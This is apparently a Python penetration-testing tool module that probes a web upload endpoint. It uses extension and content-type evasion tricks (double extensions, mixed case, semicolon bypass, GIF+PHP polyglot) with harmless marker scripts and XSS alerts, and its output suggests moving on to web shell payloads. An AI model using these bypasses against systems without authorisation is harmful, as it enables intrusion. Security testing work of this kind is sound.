"""Edge-case test: test_file_upload."""

import asyncio
import base64
import json
import time
import uuid

from burpsuite_mcp import client

from burpsuite_mcp.tools.edge._helpers import build_multipart

async def test_file_upload_impl(
    session: str,
    path: str,
    parameter: str = "file",
    test_types: list[str] | None = None,
    content_type_bypass: bool = True,
) -> str:
    """Test file upload for bypass vulnerabilities with extension and content-type evasion.

    Args:
        session: Session name
        path: Upload endpoint path
        parameter: Form field name for file upload
        test_types: Types to test: php, jsp, aspx, svg_xss, html, polyglot
        content_type_bypass: Test with mismatched Content-Type headers
    """
    types = test_types or ["php", "html", "svg_xss", "polyglot"]

    # Define test cases: (filename, content, content_type, description)
    test_cases = []

    if "php" in types:
        test_cases.extend([
            ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP direct upload"),
            ("test.php.jpg", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP double extension"),
            ("test.phtml", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHTML extension"),
            ("test.php5", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP5 extension"),
            ("test.pHp", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "Mixed case PHP"),
        ])
        if content_type_bypass:
            test_cases.append(
                ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP with image/jpeg CT"),
            )

    if "jsp" in types:
        test_cases.extend([
            ("test.jsp", '<%= "UPLOAD_TEST_OK" %>', "application/x-jsp", "JSP direct upload"),
            ("test.jsp.png", '<%= "UPLOAD_TEST_OK" %>', "image/png", "JSP double extension"),
            ("test.jspx", '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:text>UPLOAD_TEST_OK</jsp:text></jsp:root>', "application/xml", "JSPX extension"),
        ])

    if "aspx" in types:
        test_cases.extend([
            ("test.aspx", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "application/x-aspx", "ASPX direct upload"),
            ("test.aspx;.jpg", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "image/jpeg", "ASPX semicolon bypass"),
        ])

    if "svg_xss" in types:
        test_cases.extend([
            ("test.svg", '<svg onload=alert("UPLOAD_TEST_OK")>', "image/svg+xml", "SVG onload XSS"),
            ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("UPLOAD_TEST_OK")</script></svg>', "image/svg+xml", "SVG script XSS"),
        ])

    if "html" in types:
        test_cases.append(
            ("test.html", "<html><body><script>alert('UPLOAD_TEST_OK')</script></body></html>", "text/html", "HTML with JavaScript"),
        )

    if "polyglot" in types:
        test_cases.append(
            ("test.gif.php", "GIF89a; <?php echo 'UPLOAD_TEST_OK'; ?>", "image/gif", "GIF+PHP polyglot"),
        )

    lines = [f"File Upload Test: {path} (field: {parameter})\n"]
    lines.append(f"{'FILENAME':<25} {'CONTENT-TYPE':<22} {'STATUS':<8} {'RESULT':<20} {'DESCRIPTION'}")
    lines.append("-" * 110)
    vulns = []

    for filename, content, ct, desc in test_cases:
        body, boundary = build_multipart(parameter, filename, content, ct)
        resp = await client.post("/api/session/request", json={
            "session": session,
            "method": "POST",
            "path": path,
            "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}"},
            "body": body,
        })

        if "error" in resp:
            lines.append(f"{filename:<25} {ct:<22} {'ERR':<8} {'Error':<20} {desc}")
            continue

        status = resp.get("status", 0)
        resp_body = resp.get("response_body", "").lower()

        # Determine if upload succeeded
        uploaded = False
        result = "Rejected"
        if status in (200, 201):
            success_indicators = ["uploaded", "success", "stored", "saved"]
            reject_indicators = ["error", "invalid", "not allowed", "rejected", "forbidden", "unsupported", "denied"]

            success_count = sum(1 for ind in success_indicators if ind in resp_body)
            has_reject = any(ind in resp_body for ind in reject_indicators)
            has_success = success_count >= 1

            if has_success and not has_reject:
                uploaded = True
                result = "UPLOADED"
                vulns.append(f"{filename} ({desc})")
            elif not has_reject:
                result = "Possible (200)"
        elif status == 403:
            result = "Forbidden"
        elif status == 415:
            result = "Type rejected"

        marker = " ***" if uploaded else ""
        lines.append(f"{filename:<25} {ct:<22} {status:<8} {result:<20} {desc}{marker}")

    lines.append("")
    if vulns:
        lines.append(f"*** {len(vulns)} potentially dangerous uploads accepted ***")
        for v in vulns:
            lines.append(f"  -> {v}")
        lines.append("\nNext steps:")
        lines.append("  1. Check if uploaded files are accessible (look for URL/path in response)")
        lines.append("  2. Try accessing uploaded file to confirm execution")
        lines.append("  3. Test with web shell payloads if execution confirmed")
    else:
        lines.append("No dangerous file uploads accepted.")

    return "\n".join(lines)
